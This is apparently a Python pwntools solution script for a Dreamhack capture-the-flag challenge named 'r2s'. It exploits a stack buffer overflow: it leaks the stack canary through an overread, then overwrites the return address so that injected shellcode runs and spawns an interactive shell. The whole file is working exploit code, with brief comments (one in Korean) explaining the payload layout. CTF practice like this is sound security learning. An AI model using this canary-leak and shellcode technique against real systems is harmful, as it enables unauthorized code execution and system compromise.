'''
target = process("./r2s")
p = b'A'*0x51
target.send(p)
# print(target.recvline())
target.recvuntil(p)
canary = b'\x00' + target.recvn(7)
print(hex(u64(canary)))
# target.send(p[1:] + canary + b'OVERFLOW')
sh = asm(shellcraft.sh())
p = sh.ljust(0x50, b'A')
target.sendlineafter(b'Input:', p)

target.interactive()
'''
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')
#p = remote("host3.dreamhack.games", "11171")

context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'Address of the buf: ')
buf = int(p.recvline()[:-1], 16) # remote '\n'
slog('Address of buf', buf)

p.recvuntil(b'buf and $rbp: ')
buf2sfp = int(p.recvline().split()[0]) # another way to remove '\n'
buffer_to_canary = buf2sfp - 8 # canary is in rbp+8, so buf + buffer_to_canary - 8 is address of canary
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buffer_to_canary)

# [2] Leak canary value
payload = b'A'*(buffer_to_canary + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
canary = b'\x00'+p.recvn(7)
slog('Canary', u64(canary))

# [3] Exploit
shell_code = asm(shellcraft.sh()) 
print('Length of Shell Code:' , len(shell_code))
payload = shell_code.ljust(buffer_to_canary, b'A') + canary + b'B' * 0x8 + p64(buf)
# 버퍼에 쉘 코드를 넣고, 남는 공백은 아무 문자로 메꾼다. 그 후 카나리를 잘 덮고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
